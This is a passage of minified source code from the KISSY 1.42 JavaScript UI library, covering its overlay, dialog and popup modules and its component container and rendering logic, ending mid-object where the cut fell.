/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:17
*/
KISSY.add("overlay/extension/loading", ["node"], function (h, e) {
  function c() {}
  var g = e("node");
  c.prototype = {
    loading: function () {
      this._loadingExtEl || (this._loadingExtEl = new g('<div class="' + this.get("prefixCls") + 'ext-loading" style="position: absolute;border: none;width: 100%;top: 0;left: 0;z-index: 99999;height:100%;*height: expression(this.parentNode.offsetHeight);"/>').appendTo(this.$el));
      this._loadingExtEl.show();
    },
    unloading: function () {
      var b = this._loadingExtEl;
      b && b.hide();
    }
  };
  return c;
});
KISSY.add("overlay/extension/mask", ["node"], function (h, e) {
  function c(a, b) {
    var i = a.view.getBaseCssClasses("mask"),
      i = m('<div  style="width:' + (f ? "expression(KISSY.DOM.docWidth())" : "100%") + ";left:0;top:0;height:" + (f ? "expression(KISSY.DOM.docHeight())" : "100%") + ";position:" + (f ? "absolute" : "fixed") + ';" class="' + i + " " + b + '">' + (f ? '<iframe style="position:absolute;left:0;top:0;background:red;width: expression(this.parentNode.offsetWidth);height: expression(this.parentNode.offsetHeight);filter:alpha(opacity=0);z-index:-1;"></iframe>' : "") + "</div>").prependTo("body");
    i.unselectable();
    i.on("mousedown", function (a) {
      a.preventDefault();
    });
    return i;
  }
  function g() {}
  function b(a, i) {
    var b = a.get("maskNode"),
      d = a.view.getBaseCssClasses("mask-hidden");
    i ? b.removeClass(d) : b.addClass(d);
  }
  function a(a, i, d, c) {
    var f = a.effect || l;
    b(c, d);
    if (f !== l) {
      var c = a.duration,
        a = a.easing,
        e = d ? 1 : 0;
      i.stop(1, 1);
      i.css("display", d ? l : "block");
      i[f + j[f][e]](c, function () {
        i.css("display", "");
      }, a);
    }
  }
  function i(i) {
    var d = this.get("maskNode");
    if (i = i.newVal) {
      var b = Number(this.$el.css("z-index"));
      isNaN(b) || d.css("z-index", b);
    }
    a(this.get("mask"), d, i, this);
  }
  var d = h.UA,
    o = e("node"),
    f = 6 === d.ie,
    m = o.all;
  g.ATTRS = {
    mask: {
      value: !1
    },
    maskNode: {}
  };
  var l = "none",
    j = {
      fade: ["Out", "In"],
      slide: ["Up", "Down"]
    };
  g.prototype = {
    __renderUI: function () {
      this.get("mask") && this.set("maskNode", c(this, this.get("visible") ? "" : this.view.getBaseCssClasses("mask-hidden")));
    },
    __bindUI: function () {
      var a, d;
      if (d = this.get("mask")) {
        a = this.get("maskNode");
        if (d.closeOnClick) a.on(o.Gesture.tap, this.close, this);
        this.on("afterVisibleChange", i);
      }
    },
    __destructor: function () {
      var a;
      (a = this.get("maskNode")) && a.remove();
    }
  };
  return g;
});
KISSY.add("overlay/close-xtpl", [], function () {
  return function (h) {
    var e,
      c = this;
    e = this.config.utils;
    var g = e.runBlockCommand,
      b = e.renderOutput,
      a = e.getProperty,
      i = e.runInlineCommand,
      d = e.getPropertyOrRunCommand;
    e = "";
    var o = {},
      f = [],
      a = a(c, h, "closable", 0, 1);
    f.push(a);
    o.params = f;
    o.fn = function (a) {
      var f;
      f = '\n<a href="javascript:void(\'close\')"\n   id="ks-overlay-close-';
      var e = d(c, a, {}, "id", 0, 3);
      f += b(e, !0);
      f += '"\n   class="';
      var e = {},
        g = [];
      g.push("close");
      e.params = g;
      e = i(c, a, e, "getBaseCssClasses", 4);
      f += b(e, !0);
      f += "\"\n   role='button'>\n    <span class=\"";
      e = {};
      g = [];
      g.push("close-x");
      e.params = g;
      a = i(c, a, e, "getBaseCssClasses", 6);
      f += b(a, !0);
      return f + '">close</span>\n</a>\n';
    };
    e += g(c, h, o, "if", 1);
    return e + "\n";
  };
});
KISSY.add("overlay/overlay-xtpl", ["overlay/close-xtpl", "component/extension/content-xtpl"], function (h, e, c, g) {
  return function (b) {
    var a, i;
    a = this.config.utils;
    "undefined" !== typeof g && g.kissy && (i = g);
    var d = a.renderOutput,
      c = a.runInlineCommand;
    a = "";
    var f = {},
      m = [];
    m.push("overlay/close-xtpl");
    f.params = m;
    i && (e("overlay/close-xtpl"), f.params[0] = i.resolveByName(f.params[0]));
    f = c(this, b, f, "include", 1);
    a += d(f, !1);
    a += "\n";
    f = {};
    m = [];
    m.push("component/extension/content-xtpl");
    f.params = m;
    i && (e("component/extension/content-xtpl"), f.params[0] = i.resolveByName(f.params[0]));
    b = c(this, b, f, "include", 2);
    return a += d(b, !1);
  };
});
KISSY.add("overlay/overlay-render", ["component/container", "./overlay-xtpl", "component/extension/content-render"], function (h, e) {
  var c = e("component/container"),
    g = e("./overlay-xtpl"),
    b = e("component/extension/content-render");
  return c.getDefaultRender().extend([b], {
    createDom: function () {
      this.fillChildrenElsBySelectors({
        closeBtn: "#ks-overlay-close-{id}"
      });
    }
  }, {
    ATTRS: {
      contentTpl: {
        value: g
      }
    },
    HTML_PARSER: {
      closeBtn: function (a) {
        return a.one("." + this.getBaseCssClass("close"));
      }
    }
  });
});
KISSY.add("overlay/extension/overlay-effect", [], function (h) {
  function e(a) {
    var d = a.$el.clone(!0);
    d.css({
      visibility: "visible",
      overflow: "hidden"
    }).addClass(a.get("prefixCls") + "overlay-ghost");
    return a.__afterCreateEffectGhost(d);
  }
  function c(a, d, b) {
    a.__effectGhost && a.__effectGhost.stop(1, 1);
    var f = a.$el,
      c = h.all,
      g = a.get("effect"),
      j = c(g.target),
      c = g.duration,
      j = h.mix(j.offset(), {
        width: j.width(),
        height: j.height()
      }),
      k = h.mix(f.offset(), {
        width: f.width(),
        height: f.height()
      }),
      n = e(a),
      g = g.easing;
    n.insertAfter(f);
    d ? (d = j, j = k) : d = k;
    f.css("visibility", "hidden");
    n.css(d);
    a.__effectGhost = n;
    n.animate(j, {
      duration: c,
      easing: g,
      complete: function () {
        a.__effectGhost = null;
        n.remove();
        f.css("visibility", "");
        b();
      }
    });
  }
  function g(b, d, e) {
    var f = b.$el,
      g = b.get("effect"),
      h = g.effect || "none",
      j = g.target;
    "none" === h && !j ? e() : j ? c(b, d, e) : (b = g.duration, g = g.easing, j = d ? 1 : 0, f.stop(1, 1), f.css({
      visibility: "visible",
      display: d ? "none" : "block"
    }), f[h + a[h][j]](b, function () {
      f.css({
        display: "block",
        visibility: ""
      });
      e();
    }, g));
  }
  function b() {}
  var a = {
    fade: ["Out", "In"],
    slide: ["Up", "Down"]
  };
  b.ATTRS = {
    effect: {
      value: {
        effect: "",
        target: null,
        duration: 0.5,
        easing: "easeOut"
      },
      setter: function (b) {
        var d = b.effect;
        "string" === typeof d && !a[d] && (b.effect = "");
      }
    }
  };
  b.prototype = {
    __afterCreateEffectGhost: function (a) {
      return a;
    },
    _onSetVisible: function (a) {
      var b = this;
      g(b, a, function () {
        b.fire(a ? "show" : "hide");
      });
    }
  };
  return b;
});
KISSY.add("overlay/control", "component/container,component/extension/shim,component/extension/align,./extension/loading,./extension/mask,./overlay-render,./extension/overlay-effect".split(","), function (h, e) {
  var c = e("component/container"),
    g = e("component/extension/shim"),
    b = e("component/extension/align"),
    a = e("./extension/loading"),
    i = e("./extension/mask"),
    d = e("./overlay-render"),
    o = e("./extension/overlay-effect"),
    f = {
      hide: "hide",
      destroy: "destroy"
    };
  return c.extend([g, a, b, i, o], {
    bindUI: function () {
      var a = this,
        b = a.get("closeBtn");
      if (b) b.on("click", function (b) {
        a.close();
        b.preventDefault();
      });
    },
    close: function () {
      this[f[this.get("closeAction")] || "hide"]();
      return this;
    }
  }, {
    ATTRS: {
      contentEl: {},
      closable: {
        value: false,
        view: 1
      },
      closeBtn: {
        view: 1
      },
      closeAction: {
        value: "hide"
      },
      focusable: {
        value: false
      },
      allowTextSelection: {
        value: true
      },
      handleMouseEvents: {
        value: false
      },
      visible: {
        value: false
      },
      xrender: {
        value: d
      }
    },
    xclass: "overlay"
  });
});
KISSY.add("overlay/dialog-xtpl", ["overlay/close-xtpl"], function (h, e, c, g) {
  return function (b) {
    var a,
      c = this,
      d;
    a = this.config.utils;
    "undefined" !== typeof g && g.kissy && (d = g);
    var h = a.runBlockCommand,
      f = a.renderOutput,
      m = a.getProperty,
      l = a.runInlineCommand,
      j = a.getPropertyOrRunCommand;
    a = "";
    var k = {},
      n = [];
    n.push("overlay/close-xtpl");
    k.params = n;
    d && (e("overlay/close-xtpl"), k.params[0] = d.resolveByName(k.params[0]));
    d = l(c, b, k, "include", 1);
    a += f(d, !1);
    a += '\n<div id="ks-content-';
    d = j(c, b, {}, "id", 0, 2);
    a += f(d, !0);
    a += '"\n     class="';
    d = {};
    k = [];
    k.push("content");
    d.params = k;
    d = l(c, b, d, "getBaseCssClasses", 3);
    a += f(d, !0);
    a += '">\n    <div class="';
    d = {};
    k = [];
    k.push("header");
    d.params = k;
    d = l(c, b, d, "getBaseCssClasses", 4);
    a += f(d, !0);
    a += '"\n         style="\n';
    d = {};
    k = [];
    n = m(c, b, "headerStyle", 0, 6);
    k.push(n);
    d.params = k;
    d.fn = function (a) {
      var b;
      b = " \n ";
      var d = j(c, a, {}, "xindex", 0, 7);
      b = b + f(d, true);
      b = b + ":";
      a = j(c, a, {}, ".", 0, 7);
      b = b + f(a, true);
      return b + ";\n";
    };
    a += h(c, b, d, "each", 6);
    a += '\n"\n         id="ks-stdmod-header-';
    d = j(c, b, {}, "id", 0, 10);
    a += f(d, !0);
    a += '">';
    d = j(c, b, {}, "headerContent", 0, 10);
    a += f(d, !1);
    a += '</div>\n\n    <div class="';
    d = {};
    k = [];
    k.push("body");
    d.params = k;
    d = l(c, b, d, "getBaseCssClasses", 12);
    a += f(d, !0);
    a += '"\n         style="\n';
    d = {};
    k = [];
    n = m(c, b, "bodyStyle", 0, 14);
    k.push(n);
    d.params = k;
    d.fn = function (a) {
      var b;
      b = " \n ";
      var d = j(c, a, {}, "xindex", 0, 15);
      b = b + f(d, true);
      b = b + ":";
      a = j(c, a, {}, ".", 0, 15);
      b = b + f(a, true);
      return b + ";\n";
    };
    a += h(c, b, d, "each", 14);
    a += '\n"\n         id="ks-stdmod-body-';
    d = j(c, b, {}, "id", 0, 18);
    a += f(d, !0);
    a += '">';
    d = j(c, b, {}, "bodyContent", 0, 18);
    a += f(d, !1);
    a += '</div>\n\n    <div class="';
    d = {};
    k = [];
    k.push("footer");
    d.params = k;
    l = l(c, b, d, "getBaseCssClasses", 20);
    a += f(l, !0);
    a += '"\n         style="\n';
    l = {};
    d = [];
    m = m(c, b, "footerStyle", 0, 22);
    d.push(m);
    l.params = d;
    l.fn = function (a) {
      var b;
      b = " \n ";
      var d = j(c, a, {}, "xindex", 0, 23);
      b = b + f(d, true);
      b = b + ":";
      a = j(c, a, {}, ".", 0, 23);
      b = b + f(a, true);
      return b + ";\n";
    };
    a += h(c, b, l, "each", 22);
    a += '\n"\n         id="ks-stdmod-footer-';
    h = j(c, b, {}, "id", 0, 26);
    a += f(h, !0);
    a += '">';
    b = j(c, b, {}, "footerContent", 0, 26);
    a += f(b, !1);
    return a + '</div>\n</div>\n<div tabindex="0"></div>';
  };
});
KISSY.add("overlay/dialog-render", ["./overlay-render", "./dialog-xtpl"], function (h, e) {
  var c = e("./overlay-render"),
    g = e("./dialog-xtpl");
  return c.extend({
    beforeCreateDom: function (b) {
      h.mix(b.elAttrs, {
        role: "dialog",
        "aria-labelledby": "ks-stdmod-header-" + this.control.get("id")
      });
    },
    createDom: function () {
      this.fillChildrenElsBySelectors({
        header: "#ks-stdmod-header-{id}",
        body: "#ks-stdmod-body-{id}",
        footer: "#ks-stdmod-footer-{id}"
      });
    },
    getChildrenContainerEl: function () {
      return this.control.get("body");
    },
    _onSetBodyStyle: function (b) {
      this.control.get("body").css(b);
    },
    _onSetHeaderStyle: function (b) {
      this.control.get("header").css(b);
    },
    _onSetFooterStyle: function (b) {
      this.control.get("footer").css(b);
    },
    _onSetBodyContent: function (b) {
      var a;
      a = this.control.get("body");
      a.html(b);
    },
    _onSetHeaderContent: function (b) {
      var a;
      a = this.control.get("header");
      a.html(b);
    },
    _onSetFooterContent: function (b) {
      var a;
      a = this.control.get("footer");
      a.html(b);
    }
  }, {
    ATTRS: {
      contentTpl: {
        value: g
      }
    },
    HTML_PARSER: {
      header: function (b) {
        return b.one("." + this.getBaseCssClass("header"));
      },
      body: function (b) {
        return b.one("." + this.getBaseCssClass("body"));
      },
      footer: function (b) {
        return b.one("." + this.getBaseCssClass("footer"));
      },
      headerContent: function (b) {
        return b.one("." + this.getBaseCssClass("header")).html();
      },
      bodyContent: function (b) {
        return b.one("." + this.getBaseCssClass("body")).html();
      },
      footerContent: function (b) {
        return (b = b.one("." + this.getBaseCssClass("footer"))) && b.html();
      }
    }
  });
});
KISSY.add("overlay/dialog", ["./control", "./dialog-render", "node"], function (h, e) {
  var c = e("./control"),
    g = e("./dialog-render"),
    b = e("node"),
    c = c.extend({
      __afterCreateEffectGhost: function (a) {
        var b = this.get("body");
        a.all("." + this.get("prefixCls") + "stdmod-body").css({
          height: b.height(),
          width: b.width()
        }).html("");
        return a;
      },
      handleKeyDownInternal: function (c) {
        if (this.get("escapeToClose") && c.keyCode === b.KeyCode.ESC) {
          if ("select" !== c.target.nodeName.toLowerCase() || c.target.disabled) this.close(), c.halt();
        } else a: if (c.keyCode === a) {
          var d = this.$el,
            e = b.all(c.target),
            f = d.last();
          if (e.equals(d) && c.shiftKey) f[0].focus(), c.halt();else if (e.equals(f) && !c.shiftKey) this.focus(), c.halt();else if (e.equals(d) || d.contains(e)) break a;
          c.halt();
        }
      },
      _onSetVisible: function (a, b) {
        var c = this.el;
        if (a) this.__lastActive = c.ownerDocument.activeElement, this.focus(), c.setAttribute("aria-hidden", "false");else {
          c.setAttribute("aria-hidden", "true");
          try {
            this.__lastActive && this.__lastActive.focus();
          } catch (f) {}
        }
        this.callSuper(a, b);
      }
    }, {
      ATTRS: {
        header: {
          view: 1
        },
        body: {
          view: 1
        },
        footer: {
          view: 1
        },
        bodyStyle: {
          value: {},
          view: 1
        },
        footerStyle: {
          value: {},
          view: 1
        },
        headerStyle: {
          value: {},
          view: 1
        },
        headerContent: {
          value: "",
          view: 1
        },
        bodyContent: {
          value: "",
          view: 1
        },
        footerContent: {
          value: "",
          view: 1
        },
        closable: {
          value: !0
        },
        xrender: {
          value: g
        },
        focusable: {
          value: !0
        },
        escapeToClose: {
          value: !0
        }
      },
      xclass: "dialog"
    }),
    a = b.KeyCode.TAB;
  return c;
});
KISSY.add("overlay/popup", ["./control"], function (h, e) {
  return e("./control").extend({
    initializer: function () {
      var c = this;
      c.get("trigger") && ("mouse" === c.get("triggerType") ? (c._bindTriggerMouse(), c.on("afterRenderUI", function () {
        c._bindContainerMouse();
      })) : c._bindTriggerClick());
    },
    _bindTriggerMouse: function () {
      var c = this,
        e = c.get("trigger"),
        b;
      c.__mouseEnterPopup = function (a) {
        c._clearHiddenTimer();
        b = h.later(function () {
          c._showing(a);
          b = void 0;
        }, 1E3 * c.get("mouseDelay"));
      };
      e.on("mouseenter", c.__mouseEnterPopup);
      c._mouseLeavePopup = function () {
        b && (b.cancel(), b = void 0);
        c._setHiddenTimer();
      };
      e.on("mouseleave", c._mouseLeavePopup);
    },
    _bindContainerMouse: function () {
      this.$el.on("mouseleave", this._setHiddenTimer, this).on("mouseenter", this._clearHiddenTimer, this);
    },
    _setHiddenTimer: function () {
      var c = this;
      c._hiddenTimer = h.later(function () {
        c._hiding();
      }, 1E3 * c.get("mouseDelay"));
    },
    _clearHiddenTimer: function () {
      this._hiddenTimer && (this._hiddenTimer.cancel(), this._hiddenTimer = void 0);
    },
    _bindTriggerClick: function () {
      var c = this;
      c.__clickPopup = function (e) {
        e.preventDefault();
        if (c.get("toggle")) c[c.get("visible") ? "_hiding" : "_showing"](e);else c._showing(e);
      };
      c.get("trigger").on("click", c.__clickPopup);
    },
    _showing: function (c) {
      this.set("currentTrigger", h.one(c.target));
      this.show();
    },
    _hiding: function () {
      this.set("currentTrigger", void 0);
      this.hide();
    },
    destructor: function () {
      var c = this.$el,
        e = this.get("trigger");
      e && (this.__clickPopup && e.detach("click", this.__clickPopup), this.__mouseEnterPopup && e.detach("mouseenter", this.__mouseEnterPopup), this._mouseLeavePopup && e.detach("mouseleave", this._mouseLeavePopup));
      c.detach("mouseleave", this._setHiddenTimer, this).detach("mouseenter", this._clearHiddenTimer, this);
    }
  }, {
    ATTRS: {
      trigger: {
        setter: function (c) {
          return h.all(c);
        }
      },
      triggerType: {
        value: "click"
      },
      currentTrigger: {},
      mouseDelay: {
        value: 0.1
      },
      toggle: {
        value: !1
      }
    },
    xclass: "popup"
  });
});
KISSY.add("overlay", ["overlay/control", "overlay/dialog", "overlay/popup"], function (h, e) {
  var c = e("overlay/control"),
    g = e("overlay/dialog"),
    b = e("overlay/popup");
  c.Dialog = g;
  h.Dialog = g;
  c.Popup = b;
  return h.Overlay = c;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:04
*/
KISSY.add("component/container/render", ["component/control", "component/manager"], function (g, d) {
  var f = d("component/control"),
    i = d("component/manager");
  return f.getDefaultRender().extend([], {
    decorateDom: function () {
      var d = this,
        f = d.getChildrenContainerEl(),
        a = d.control,
        b = a.get("defaultChildCfg"),
        c = b.prefixCls,
        e = b.xclass,
        h = [];
      f.children().each(function (a) {
        var f = d.getComponentConstructorByNode(c, a) || e && i.getConstructorByXClass(e);
        f && h.push(new f(g.merge(b, {
          srcNode: a
        })));
      });
      a.set("children", h);
    },
    getChildrenContainerEl: function () {
      return this.$el;
    }
  }, {
    name: "ContainerRender"
  });
});
KISSY.add("component/container", ["component/control", "./container/render"], function (g, d) {
  function f(a) {
    if (a.target === this) {
      var b = a.component,
        c = this.get("children"),
        a = a.index;
      c.splice(a, 0, b);
      c = this.get("children");
      b = c[a];
      b.setInternal("parent", this);
      this.get("rendered") && this.renderChild(a);
      this.fire("afterAddChild", {
        component: b,
        index: a
      });
    }
  }
  function i(a) {
    if (a.target === this) {
      var b = a.component,
        c,
        e,
        h = a.destroy,
        d = this.get("children"),
        a = a.index;
      -1 !== a && d.splice(a, 1);
      b.setInternal("parent", null);
      if (h) b.destroy && b.destroy();else if (b.get && (e = b.el)) (c = e.parentNode) && c.removeChild(e);
      this.fire("afterRemoveChild", {
        component: b,
        index: a
      });
    }
  }
  var j = d("component/control"),
    k = d("./container/render");
  return j.extend({
    isContainer: !0,
    initializer: function () {
      var a = this.get("prefixCls"),
        b = this.get("defaultChildCfg");
      this.publish("beforeAddChild", {
        defaultFn: f
      });
      this.publish("beforeRemoveChild", {
        defaultFn: i
      });
      b.prefixCls = b.prefixCls || a;
    },
    createDom: function () {
      this.createChildren();
    },
    renderUI: function () {
      this.renderChildren();
    },
    renderChildren: function () {
      var a,
        b = this.get("children");
      for (a = 0; a < b.length; a++) this.renderChild(a);
    },
    createChildren: function () {
      var a,
        b = this.get("children");
      for (a = 0; a < b.length; a++) this.createChild(a);
    },
    addChild: function (a, b) {
      var c = this.get("children");
      void 0 === b && (b = c.length);
      this.fire("beforeAddChild", {
        component: a,
        index: b
      });
    },
    renderChild: function (a) {
      var b = this.get("children");
      this.createChild(a).render();
      this.fire("afterRenderChild", {
        component: b[a],
        index: a
      });
    },
    createChild: function (a) {
      var b, c, e, d;
      b = this.get("children")[a];
      d = this.view.getChildrenContainerEl();
      e = d[0];
      c = e.children[a] || null;
      b.get("rendered") ? (d = b.el, d.parentNode !== e && e.insertBefore(d, c)) : (c ? b.set("elBefore", c) : b.set("render", d), b.create());
      this.fire("afterCreateChild", {
        component: b,
        index: a
      });
      return b;
    },
    removeChild: function (a, b) {
      void 0 === b && (b = !0);
      this.fire("beforeRemoveChild", {
        component: a,
        index: g.indexOf(a, this.get("children")),
        destroy: b
      });
    },
    removeChildren: function (a) {
      var b,
        c = [].concat(this.get("children"));
      for (b = 0; b < c.length; b++) this.removeChild(c[b], a);
      return this;
    },
    getChildAt: function (a) {
      return this.get("children")[a] || null;
    },
    destructor: function () {
      var a,
        b = this.get("children");
      for (a = 0; a < b.length; a++) b[a].destroy && b[a].destroy();
    }
  }, {
    ATTRS: {
      children: {
        value: [],
        getter: function (a) {
          var b = null,
            c,
            d;
          for (c = 0; c < a.length; c++) d = a[c], d.isControl || (b = b || this.get("defaultChildCfg"), g.mix(d, b, !1), a[c] = this.createComponent(d));
          return a;
        },
        setter: function (a) {
          var b, c;
          for (b = 0; b < a.length; b++) c = a[b], c.isControl && c.setInternal("parent", this);
        }
      },
      defaultChildCfg: {
        value: {}
      },
      xrender: {
        value: k
      }
    },
    name: "container"
  });
});
/*
Copyright 2014, KISSY v1.42
MIT Licensed
build time: Mar 6 13:34
*/
KISSY.add("component/control/process", ["base", "promise"], function (e, b) {
  function g(b) {
    b.fire("beforeSyncUI");
    b.syncUI();
    b.__callPluginsMethod("pluginSyncUI");
    b.fire("afterSyncUI");
  }
  var n = b("base"),
    m = b("promise").Defer,
    h = n.prototype.__getHook,
    c = e.noop,
    i = n.extend({
      bindInternal: c,
      syncInternal: c,
      initializer: function () {
        this._renderedDefer = new m();
      },
      renderUI: c,
      syncUI: c,
      bindUI: c,
      onRendered: function (b) {
        return this._renderedDefer.promise.then(b);
      },
      create: function () {
        this.get("created") || (this.fire("beforeCreateDom"), this.createInternal(), this.__callPluginsMethod("pluginCreateDom"), this.fire("afterCreateDom"), this.setInternal("created", !0));
        return this;
      },
      createInternal: function () {
        this.createDom();
      },
      render: function () {
        this.get("rendered") || (this.create(), this.fire("beforeRenderUI"), this.renderUI(), this.__callPluginsMethod("pluginRenderUI"), this.fire("afterRenderUI"), this.fire("beforeBindUI"), i.superclass.bindInternal.call(this), this.bindUI(), this.__callPluginsMethod("pluginBindUI"), this.fire("afterBindUI"), i.superclass.syncInternal.call(this), g(this), this.setInternal("rendered", !0));
        return this;
      },
      sync: function () {
        g(this);
      },
      plug: function (b) {
        var c = this.get("plugins");
        this.callSuper(b);
        b = c[c.length - 1];
        this.get("rendered") ? (b.pluginCreateDom && b.pluginCreateDom(this), b.pluginRenderUI && b.pluginCreateDom(this), b.pluginBindUI && b.pluginBindUI(this), b.pluginSyncUI && b.pluginSyncUI(this)) : this.get("created") && b.pluginCreateDom && b.pluginCreateDom(this);
        return this;
      }
    }, {
      __hooks__: {
        createDom: h("__createDom"),
        renderUI: h("__renderUI"),
        bindUI: h("__bindUI"),
        syncUI: h("__syncUI")
      },
      name: "ComponentProcess",
      ATTRS: {
        rendered: {
          value: !1,
          setter: function (b) {
            b && this._renderedDefer.resolve(this);
          }
        },
        created: {
          value: !1
        }
      }
    });
  return i;
});
KISSY.add("component/control/render-xtpl", [], function () {
  return function (e) {
    var b,
      g = this;
    b = this.config.utils;
    var n = b.runBlockCommand,
      m = b.renderOutput,
      h = b.getProperty,
      c = b.runInlineCommand,
      i = b.getPropertyOrRunCommand;
    b = '<div id="';
    var j = i(g, e, {}, "id", 0, 1);
    b += m(j, !0);
    b += '"\n class="';
    var j = {},
      l = [];
    l.push("");
    j.params = l;
    c = c(g, e, j, "getBaseCssClasses", 2);
    b += m(c, !0);
    b += "\n";
    c = {};
    j = [];
    l = h(g, e, "elCls", 0, 3);
    j.push(l);
    c.params = j;
    c.fn = function (b) {
      var a;
      a = "\n ";
      b = i(g, b, {}, ".", 0, 4);
      a += m(b, !0);
      return a + "  \n";
    };
    b += n(g, e, c, "each", 3);
    b += '\n"\n\n';
    c = {};
    j = [];
    l = h(g, e, "elAttrs", 0, 8);
    j.push(l);
    c.params = j;
    c.fn = function (b) {
      var a;
      a = " \n ";
      var d = i(g, b, {}, "xindex", 0, 9);
      a += m(d, !0);
      a += '="';
      b = i(g, b, {}, ".", 0, 9);
      a += m(b, !0);
      return a + '"\n';
    };
    b += n(g, e, c, "each", 8);
    b += '\n\nstyle="\n';
    c = {};
    j = [];
    h = h(g, e, "elStyle", 0, 13);
    j.push(h);
    c.params = j;
    c.fn = function (b) {
      var a;
      a = " \n ";
      var d = i(g, b, {}, "xindex", 0, 14);
      a += m(d, !0);
      a += ":";
      b = i(g, b, {}, ".", 0, 14);
      a += m(b, !0);
      return a + ";\n";
    };
    b += n(g, e, c, "each", 13);
    return b + '\n">';
  };
});
KISSY.add("component/control/render", ["node", "xtemplate/runtime", "./process", "./render-xtpl", "component/manager"], function (e, b) {
  function g(k) {
    "number" === typeof k && (k += "px");
    return k;
  }
  function n(k) {
    k || (k = [""]);
    "string" === typeof k && (k = k.split(/\s+/));
    return k;
  }
  function m(k, a, b) {
    for (var d = "", f = 0, c = b.length, a = k + a; f < c; f++) k = (k = b[f]) ? "-" + k : k, d += " " + a + k;
    return d;
  }
  function h(a) {
    var b;
    a.target === this.control && (b = this[q + a.type.slice(5).slice(0, -6)], b.call(this, a.newVal, a));
  }
  function c(a, b) {
    return this.config.view.getBaseCssClasses(b.params[0]);
  }
  function i(a, b) {
    return this.config.view.getBaseCssClass(b.params[0]);
  }
  var j = b("node"),
    l = b("xtemplate/runtime"),
    o = b("./process"),
    a = b("./render-xtpl"),
    d = b("component/manager"),
    q = "_onSet",
    r = e.trim,
    s = j.all,
    t = e.UA,
    u = e.Env.host.document;
  return o.extend({
    isRender: !0,
    createInternal: function () {
      var a = this.control.get("srcNode");
      a ? this.decorateDom(a) : this.callSuper();
    },
    beforeCreateDom: function (a) {
      var b = this.control,
        d,
        c,
        f,
        e = b.get("elAttrs"),
        j = b.get("elCls"),
        h;
      d = b.getAttrs();
      h = b.get("elStyle");
      var m = b.get("elCls");
      for (c in d) f = d[c], f.view && (a[c] = b.get(c));
      d = a.width;
      c = a.height;
      f = a.visible;
      a = a.zIndex;
      d && (h.width = g(d));
      c && (h.height = g(c));
      a && (h["z-index"] = a);
      f || m.push(this.getBaseCssClasses("hidden"));
      if (h = b.get("disabled")) j.push(this.getBaseCssClasses("disabled")), e["aria-disabled"] = "true";
      b.get("highlighted") && j.push(this.getBaseCssClasses("hover"));
      b.get("focusable") && (9 > t.ieMode && (e.hideFocus = "true"), e.tabindex = h ? "-1" : "0");
    },
    createDom: function () {
      this.beforeCreateDom(this.renderData = {}, this.childrenElSelectors = {}, this.renderCommands = {
        getBaseCssClasses: c,
        getBaseCssClass: i
      });
      var b = this.control,
        p;
      p = this.renderTpl(a) + this.renderTpl(this.get("contentTpl")) + "</div>";
      b.setInternal("el", this.$el = s(p));
      this.el = this.$el[0];
      this.fillChildrenElsBySelectors();
    },
    decorateDom: function (a) {
      var b = this.control;
      a.attr("id") || a.attr("id", b.get("id"));
      var d = this.constructor.HTML_PARSER,
        c,
        f;
      for (c in d) f = d[c], "function" === typeof f ? (f = f.call(this, a), void 0 !== f && b.setInternal(c, f)) : "string" === typeof f ? b.setInternal(c, a.one(f)) : e.isArray(f) && f[0] && b.setInternal(c, a.all(f[0]));
      b.setInternal("el", this.$el = a);
      this.el = a[0];
    },
    renderUI: function () {
      var a = this.control,
        b = this.$el;
      if (!a.get("srcNode")) {
        var d = a.get("render");
        (a = a.get("elBefore")) ? b.insertBefore(a, void 0) : d ? b.appendTo(d, void 0) : b.appendTo(u.body, void 0);
      }
    },
    bindUI: function () {
      var a = this.control,
        b = a.getAttrs(),
        d,
        c;
      for (d in b) {
        c = b[d];
        var f = e.ucfirst(d),
          g = this[q + f];
        if (c.view && g) a.on("after" + f + "Change", h, this);
      }
    },
    destructor: function () {
      this.$el && this.$el.remove();
    },
    $: function (a) {
      return this.$el.all(a);
    },
    fillChildrenElsBySelectors: function (a) {
      var b = this.$el,
        d = this.control,
        c,
        f,
        a = a || this.childrenElSelectors;
      for (c in a) f = a[c], "function" === typeof f ? d.setInternal(c, f(b)) : d.setInternal(c, this.$(e.substitute(f, this.renderData))), delete a[c];
    },
    renderTpl: function (a, b, d) {
      b = b || this.renderData;
      d = d || this.renderCommands;
      return new (this.get("xtemplate"))(a, {
        control: this.control,
        view: this,
        commands: d
      }).render(b);
    },
    getComponentConstructorByNode: function (a, b) {
      var c = b[0].className;
      return c ? (c = c.replace(RegExp("\\b" + a, "ig"), ""), d.getConstructorByXClass(c)) : null;
    },
    getComponentCssClasses: function () {
      if (this.componentCssClasses) return this.componentCssClasses;
      for (var a = this.control.constructor, b, d = []; a && !a.prototype.hasOwnProperty("isControl");) (b = a.xclass) && d.push(b), a = a.superclass && a.superclass.constructor;
      return this.componentCssClasses = d;
    },
    getBaseCssClasses: function (a) {
      for (var a = n(a), b = this.getComponentCssClasses(), d = 0, c = this.get("control"), f = "", e = b.length, c = c.get("prefixCls"); d < e; d++) f += m(c, b[d], a);
      return r(f);
    },
    getBaseCssClass: function (a) {
      return r(m(this.control.get("prefixCls"), this.getComponentCssClasses()[0], n(a)));
    },
    getKeyEventTarget: function () {
      return this.$el;
    },
    _onSetWidth: function (a) {
      this.$el.width(a);
    },
    _onSetHeight: function (a) {
      this.$el.height(a);
    },
    _onSetContent: function (a) {
      var b = this.$el;
      b.html(a);
      this.get("allowTextSelection") || b.unselectable();
    },
    _onSetVisible: function (a) {
      var b = this.$el,
        d = this.getBaseCssClasses("hidden");
      a ? b.removeClass(d) : b.addClass(d);
    },
    _onSetHighlighted: function (a) {
      var b = this.getBaseCssClasses("hover");
      this.$el[a ? "addClass" : "removeClass"](b);
    },
    _onSetDisabled: function (a) {
      var b = this.control,
        d = this.getBaseCssClasses("disabled");
      this.$el[a ? "addClass" : "removeClass"](d).attr("aria-disabled", a);
      b.get("focusable") && this.getKeyEventTarget().attr("tabindex", a ? -1 : 0);
    },
    _onSetActive: function (a) {
      var b = this.getBaseCssClasses("active");
      this.$el[a ? "addClass" : "removeClass"](b).attr("aria-pressed", !!a);
    },
    _onSetFocused: function (a) {
      var b = this.$el,
        d = this.getBaseCssClasses("focused");
      b[a ? "addClass" : "removeClass"](d);
    },
    _onSetZIndex: function (a) {
      this.$el.css("z-index", a);
    }
  }, {
    __hooks__: {
      decorateDom: o.prototype.__getHook("__decorateDom"),
